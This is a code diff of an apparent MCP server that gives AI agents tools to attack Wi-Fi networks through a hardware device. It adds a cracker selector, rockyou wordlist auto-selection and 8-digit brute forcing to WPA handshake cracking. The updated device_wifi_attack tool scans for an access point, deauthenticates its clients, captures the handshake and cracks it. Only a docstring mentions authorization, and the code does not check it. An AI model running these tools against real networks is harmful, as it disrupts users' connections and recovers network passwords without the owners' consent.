@@ -475,38 +475,61 @@ DEV_HANDSHAKE_DIR = "/BrucePCAP/handshakes"
 
 
 def _resolve_wordlist(wordlist: str) -> str:
-    """Accept an absolute path, a bare name under dictionaries/wordlists/, or ''
-    (-> the bundled common.txt)."""
-    if not wordlist:
-        return os.path.join(_WORDLIST_DIR, "common.txt")
-    if os.path.isfile(wordlist):
+    """Accept an absolute path, a bare name found among discovered wordlists, or
+    '' (-> the largest discovered wordlist, e.g. rockyou, else common.txt)."""
+    import crackers as ck
+    if wordlist and os.path.isfile(wordlist):
         return wordlist
-    cand = os.path.join(_WORDLIST_DIR, wordlist)
-    return cand if os.path.isfile(cand) else wordlist
+    wls = ck.list_wordlists()
+    if wordlist:
+        for _lbl, p, _sz in wls:
+            if os.path.basename(p) == wordlist or wordlist in p:
+                return p
+    if wls:  # prefer the biggest (rockyou) when unspecified
+        return max(wls, key=lambda x: x[2])[1]
+    return os.path.join(_WORDLIST_DIR, "common.txt")
 
 
 @mcp.tool()
-def wpa_crack(pcap_path: str, wordlist: str = "", ssid: str = "") -> str:
-    """Crack a WPA/WPA2 handshake (or PMKID) from a LOCAL pcap file by dictionary
-    attack — pure offline, no device needed.
+def list_crackers() -> str:
+    """List the password-cracking tools available (aircrack-ng/hashcat/python)
+    and the wordlists discovered on disk (used by wpa_crack/device_wifi_attack)."""
+    import crackers as ck
+    out = ["crackers: " + ", ".join(ck.available_tools()), "wordlists:"]
+    for lbl, p, _sz in ck.list_wordlists():
+        out.append(f"  {lbl}  {p}")
+    return "\n".join(out) or "(none)"
 
-    pcap_path: a libpcap file with 802.11 frames (DLT 105 or radiotap).
-    wordlist: absolute path, a bare name under host/dictionaries/wordlists/, or
-              empty for the bundled common.txt.
-    ssid: override/supply the SSID if the capture has no beacon.
-    Returns the recovered passphrase or the list of handshakes found.
+
+@mcp.tool()
+def wpa_crack(pcap_path: str, wordlist: str = "", tool: str = "auto", brute: bool = False) -> str:
+    """Crack a WPA/WPA2 handshake from a LOCAL pcap using a real cracker
+    (aircrack-ng/hashcat, else pure-Python).
+
+    pcap_path: libpcap with 802.11 frames (DLT 105 or radiotap).
+    wordlist: path / bare name / '' for the largest discovered (e.g. rockyou).
+    tool: auto|aircrack-ng|hashcat|python. brute: if the wordlist fails, brute
+    all 8-digit numeric passwords. Returns the recovered passphrase or status.
     """
     try:
-        import wpa_crack as wcm
-        wl = _resolve_wordlist(wordlist)
+        import crackers as ck
         if not os.path.isfile(pcap_path):
             return f"error: no such pcap {pcap_path}"
-        res = wcm.crack_file(pcap_path, wl, ssid)
+        wl = _resolve_wordlist(wordlist)
+        bssid = ck.detect_bssid(pcap_path)
+        hc = pcap_path.rsplit(".", 1)[0] + ".hc22000"
+        try:
+            import wpa_crack as wcm
+            wcm.export_hc22000(pcap_path, hc)
+        except Exception:  # noqa: BLE001
+            hc = ""
+        res = ck.crack_wordlist(pcap_path, wl, bssid=bssid, tool=tool, hc22000=hc)
+        if not res["ok"] and brute:
+            res = ck.crack_brute(pcap_path, "0123456789", 8, bssid=bssid, tool=tool, hc22000=hc)
         if res["ok"]:
-            return f"[KEY FOUND] {res['handshake']}\n  passphrase: {res['key']}\n  wordlist: {wl} ({res['tried']} tries)"
-        cands = "\n".join("  - " + c for c in res.get("candidates", [])) or "  (none)"
-        return (f"[not found] {res.get('error', 'wordlist exhausted')} "
-                f"(tried {res.get('tried', 0)}, wordlist {wl})\nhandshakes:\n{cands}")
+            return f"[KEY FOUND] {res['key']}\n  tool: {res['tool']}  wordlist: {wl}  bssid: {bssid}"
+        return (f"[not found] via {res.get('tool')} (wordlist {os.path.basename(wl)}"
+                + (", +8-digit brute" if brute else "") + f", bssid {bssid or '?'})")
     except Exception as e:  # noqa: BLE001
         return f"error: {e}"
 
@@ -526,24 +549,32 @@ def device_handshakes() -> str:
 
 
 @mcp.tool()
-def device_crack_handshake(remote_pcap: str, wordlist: str = "", ssid: str = "") -> str:
-    """Fetch a handshake pcap FROM THE DEVICE (sha256-verified) and crack it with
-    a wordlist. remote_pcap: a device path (e.g. /BrucePCAP/handshakes/HS_xx.pcap
-    — see device_handshakes). wordlist/ssid as in wpa_crack."""
+def device_crack_handshake(remote_pcap: str, wordlist: str = "", tool: str = "auto",
+                           brute: bool = False) -> str:
+    """Fetch a handshake pcap FROM THE DEVICE (sha256-verified) and crack it with a
+    real cracker. remote_pcap: device path (see device_handshakes). wordlist/tool/
+    brute as in wpa_crack."""
     with _lock:
         try:
             _ensure()
-            import tempfile, wpa_crack as wcm
+            import tempfile, crackers as ck, wpa_crack as wcm
             local = os.path.join(tempfile.gettempdir(), os.path.basename(remote_pcap) or "hs.pcap")
             got = _dev.file_get(remote_pcap, local,
                                 chunk=192 if _transport == "ble" else 512, timeout=120)
             wl = _resolve_wordlist(wordlist)
-            res = wcm.crack_file(local, wl, ssid)
+            bssid = ck.detect_bssid(local)
+            hc = local.rsplit(".", 1)[0] + ".hc22000"
+            try:
+                wcm.export_hc22000(local, hc)
+            except Exception:  # noqa: BLE001
+                hc = ""
+            res = ck.crack_wordlist(local, wl, bssid=bssid, tool=tool, hc22000=hc)
+            if not res["ok"] and brute:
+                res = ck.crack_brute(local, "0123456789", 8, bssid=bssid, tool=tool, hc22000=hc)
             head = f"fetched {remote_pcap} ({got.get('size', '?')} B, sha {got.get('sha256', '')[:12]}…)\n"
             if res["ok"]:
-                return head + f"[KEY FOUND] {res['handshake']}\n  passphrase: {res['key']} ({res['tried']} tries)"
-            cands = "\n".join("  - " + c for c in res.get("candidates", [])) or "  (none)"
-            return head + f"[not found] {res.get('error', 'exhausted')} (tried {res.get('tried', 0)})\n{cands}"
+                return head + f"[KEY FOUND] {res['key']}  (tool {res['tool']}, bssid {bssid})"
+            return head + f"[not found] via {res.get('tool')} (wordlist {os.path.basename(wl)})"
         except Exception as e:  # noqa: BLE001
             return f"error: {e}"
 
@@ -566,28 +597,26 @@ def device_deauth(bssid: str, sta: str = "broadcast", ch: int = 0, count: int = 
 
 @mcp.tool()
 def device_wifi_attack(ssid: str = "", bssid: str = "", ch: int = 0, wordlist: str = "",
-                       mask: str = "", brute_limit: int = 0, capture_secs: float = 20.0,
+                       tool: str = "auto", brute: bool = False, capture_secs: float = 20.0,
                        deauth_count: int = 16, rounds: int = 3) -> str:
     """Full WPA attack cycle on the device: find AP → deauth → capture handshake →
-    fetch → crack by wordlist → optional brute by mask.
+    fetch → crack with a real cracker (aircrack-ng/hashcat) → optional 8-digit brute.
 
-    Give ssid (auto-scans for bssid+channel) or bssid+ch directly. wordlist: a
-    path / bare name under dictionaries/wordlists/ / '' for common.txt. mask: a
-    hashcat-style brute mask (e.g. '?d?d?d?d?d?d?d?d' = 8 digits); brute_limit
-    caps candidates (pure-Python PBKDF2 is slow). capture_secs/deauth_count/rounds
-    tune the capture.
+    Give ssid (auto-scans for bssid+channel) or bssid+ch directly. wordlist: path /
+    bare name / '' for the largest discovered (rockyou). tool: auto|aircrack-ng|
+    hashcat|python. brute: brute all 8-digit numerics if the wordlist fails.
+    capture_secs/deauth_count/rounds tune the capture.
 
-    LEGAL: authorized testing only — deauth is an active attack."""
+    LEGAL: authorized testing of your OWN network only — deauth is an active attack."""
     with _lock:
         try:
             _ensure()
             import wifi_attack, tempfile
-            wl = _resolve_wordlist(wordlist) if (wordlist or not mask) else ""
+            wl = _resolve_wordlist(wordlist)
             logs = []
             out = wifi_attack.run_attack(
-                _dev, ssid=ssid, bssid=bssid, ch=ch, wordlist=wl, mask=mask,
-                brute_limit=brute_limit, capture_secs=capture_secs,
-                deauth_count=deauth_count, rounds=rounds,
+                _dev, ssid=ssid, bssid=bssid, ch=ch, wordlist=wl, brute=brute, tool=tool,
+                capture_secs=capture_secs, deauth_count=deauth_count, rounds=rounds,
                 local_dir=tempfile.gettempdir(), log=logs.append)
             return "\n".join(logs) + "\n\n" + wifi_attack.format_result(out)
         except Exception as e:  # noqa: BLE001
